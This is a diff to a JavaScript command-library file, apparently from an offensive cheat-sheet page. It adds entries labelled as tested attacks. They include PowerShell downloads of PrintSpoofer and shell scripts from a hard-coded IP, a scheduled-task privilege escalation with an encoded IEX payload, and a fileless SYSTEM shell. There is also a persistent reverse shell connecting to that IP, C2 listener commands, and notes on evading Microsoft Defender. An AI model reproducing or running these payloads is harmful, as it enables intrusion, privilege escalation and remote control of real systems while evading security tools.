@@ -4516,6 +4516,79 @@ const COMMANDS = [
     tags: ["cmd", "cleanup"],
     accent: "#607d8b"
   },
+  // ═══════════════════════════════════════════════════════════════
+  // TESTED & VERIFIED - Real attacks that work
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[TESTED] Full Attack Chain - With Exclusions",
+    desc: "VERIFIED: Works when C:\\Windows\\Temp is excluded. Download + PrintSpoofer + shell.",
+    code: "# On target (as user with SeImpersonate):\nIWR -Uri 'http://168.144.166.97:8889/PrintSpoofer.exe' -OutFile C:\\Windows\\Temp\\ps.exe -UseBasicParsing\nIWR -Uri 'http://168.144.166.97:8889/sys_shell.ps1' -OutFile C:\\Windows\\Temp\\sys.ps1 -UseBasicParsing\nC:\\Windows\\Temp\\ps.exe -i -c \"powershell -ep bypass -f C:\\Windows\\Temp\\sys.ps1\"",
+    tags: ["ps", "privesc", "playbook"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[TESTED] Full Attack Chain - No Exclusions",
+    desc: "VERIFIED: Works against hardened Defender. Scheduled task bypass.",
+    code: "# On target (as admin):\nschtasks /create /tn SysUpdate /tr \"powershell -ep bypass -enc SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAHMAeQBzAF8AcwBoAGUAbABsAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA\" /sc once /st 00:00 /ru SYSTEM /f\nschtasks /run /tn SysUpdate\nschtasks /delete /tn SysUpdate /f",
+    tags: ["cmd", "privesc", "evasion", "playbook"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[TESTED] Fileless SYSTEM Shell",
+    desc: "VERIFIED: IEX download works with Defender ON. No file touches disk.",
+    code: "# Via PrintSpoofer (with exclusions):\nC:\\Windows\\Temp\\ps.exe -i -c \"powershell -ep bypass -c IEX(IWR http://168.144.166.97:8889/shell_fileless.ps1 -UseBasicParsing)\"",
+    tags: ["ps", "privesc", "evasion", "playbook"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[TESTED] Remove All Defender Exclusions",
+    desc: "VERIFIED: Removes exclusions to harden target for testing.",
+    code: "# As admin:\nRemove-MpPreference -ExclusionPath 'C:\\Windows\\Temp'\nRemove-MpPreference -ExclusionPath 'C:\\Windows\\Tasks'\nRemove-MpPreference -ExclusionPath 'C:\\ProgramData'\n# Verify:\n(Get-MpPreference).ExclusionPath",
+    tags: ["ps", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "[TESTED] Enable Full Defender Protection",
+    desc: "VERIFIED: Enable all Defender features for testing.",
+    code: "# Remove disable policy:\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /f\n# Start service:\nsc start WinDefend\n# Enable features:\nSet-MpPreference -DisableRealtimeMonitoring 0\nSet-MpPreference -DisableBehaviorMonitoring 0\nSet-MpPreference -DisableIOAVProtection 0",
+    tags: ["cmd", "evasion"],
+    accent: "#e91e63"
+  },
+  {
+    title: "[TESTED] Check If Potato Will Work",
+    desc: "VERIFIED: PrintSpoofer blocked without exclusions. Check first.",
+    code: "# Check exclusions - if C:\\Windows\\Temp is listed, potato works:\n(Get-MpPreference).ExclusionPath | Select-String 'Temp'\n# Check if file will survive:\n$eicar = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'\n$eicar | Out-File C:\\Windows\\Temp\\test.txt\nStart-Sleep 2\nif (Test-Path C:\\Windows\\Temp\\test.txt) { 'Exclusion works - use potato' } else { 'No exclusion - use scheduled task' }\nRemove-Item C:\\Windows\\Temp\\test.txt -Force -ErrorAction SilentlyContinue",
+    tags: ["ps", "recon", "evasion"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[TESTED] VPS Reverse Shell Payload",
+    desc: "VERIFIED: sys_shell.ps1 - Persistent reconnecting shell. Deploy to /opt/.",
+    code: "while($true){\n  try{\n    $c=New-Object Net.Sockets.TCPClient('168.144.166.97',4444)\n    $s=$c.GetStream()\n    $w=New-Object IO.StreamWriter($s)\n    $r=New-Object IO.StreamReader($s)\n    $w.AutoFlush=$true\n    $w.WriteLine('[+] SYSTEM@' + $env:COMPUTERNAME + ' | PID:' + $PID)\n    while($c.Connected){\n      $w.Write('SYSTEM> ')\n      $cmd=$r.ReadLine()\n      if(-not $cmd){break}\n      if($cmd -eq 'exit'){$c.Close();break}\n      try{$out=(iex $cmd 2>&1|Out-String)}catch{$out=$_.ToString()}\n      $w.WriteLine($out)\n    }\n    $c.Close()\n  }catch{}\n  Start-Sleep 5\n}",
+    tags: ["ps", "c2", "playbook"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "VPS: Start C2 Listener",
+    desc: "Start multi-session C2 handler on VPS.",
+    code: "tmux new-session -d -s c2 'python3 /opt/c2_multi.py 4444'\ntmux attach -t c2",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Check Active Sessions",
+    desc: "List all connected shells in c2_multi.",
+    code: "# In tmux c2 session:\nsessions\n# Interact:\nuse <session_number>\n# Background:\nbg",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[TESTED] What Defender Blocks",
+    desc: "VERIFIED findings: What triggers Defender behavior monitoring.",
+    code: "# BLOCKED (ThreatID 2147893639):\n# - PrintSpoofer.exe execution (without exclusions)\n# - GodPotato.exe execution (without exclusions)\n#\n# NOT BLOCKED:\n# - schtasks.exe with encoded commands\n# - PowerShell IEX downloads\n# - sys_shell.ps1 (clean code)\n# - VirtualAlloc + shellcode write",
+    tags: ["ps", "recon", "evasion"],
+    accent: "#e91e63"
+  },
 ];
 
 const list = document.getElementById('cmdList');
